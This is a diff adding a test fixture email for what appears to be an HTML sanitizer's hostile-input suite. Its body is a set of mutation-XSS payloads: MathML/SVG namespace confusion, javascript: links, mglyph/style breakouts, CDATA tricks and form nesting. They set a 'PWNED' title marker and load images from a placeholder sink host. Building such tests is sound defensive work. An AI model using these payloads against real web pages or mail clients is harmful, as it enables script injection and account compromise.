@@ -1,0 +1,24 @@
+From: Hostile Sender <hostile@example.org>
+To: hostile@example.test
+Subject: Hostile 20: MathML/SVG namespace confusion, math href, mglyph, form nesting
+Date: Mon, 2 Nov 2026 10:20:00 +0000
+Message-ID: <hostile-20@example.org>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"></head><body>
+<p>Visible text 20</p>
+<math><mi xlink:href="javascript:top.document.title='PWNED'">click</mi></math>
+<math href="javascript:top.document.title='PWNED'"><mtext>mathlink</mtext></math>
+<math><maction actiontype="statusline#http://sink/x" xlink:href="javascript:top.document.title='PWNED'">m</maction></math>
+<math><mtext><table><mglyph><style><img src=http://sink/20-mxss-math-svg/mglyph onerror="top.document.title='PWNED'">
+<math><mtext><option><FAKEFAKE><option></option><mglyph><svg></svg><style><a title="</style><img src=http://sink/20-mxss-math-svg/mtext-option onerror='top.document.title='PWNED''>"></mglyph></math>
+<svg><desc><![CDATA[</desc><script>top.document.title='PWNED'</script>]]></desc></svg>
+<svg><![CDATA[><image xlink:href="]]><img src=x:x onerror="top.document.title='PWNED'">
+<svg><p><style><img src="</style><img src=http://sink/20-mxss-math-svg/svg-p onerror='top.document.title='PWNED''>">
+<form><math><mtext></form><form><mglyph><style></math><img src=http://sink/20-mxss-math-svg/form-nest onerror="top.document.title='PWNED'">
+<svg><a><animate attributeName=href values=javascript:top.document.title='PWNED' /><text>x</text></a></svg>
+<svg><title><a id="</title><img src=http://sink/20-mxss-math-svg/svg-title onerror='top.document.title='PWNED''>"></title></svg>
+</body></html>
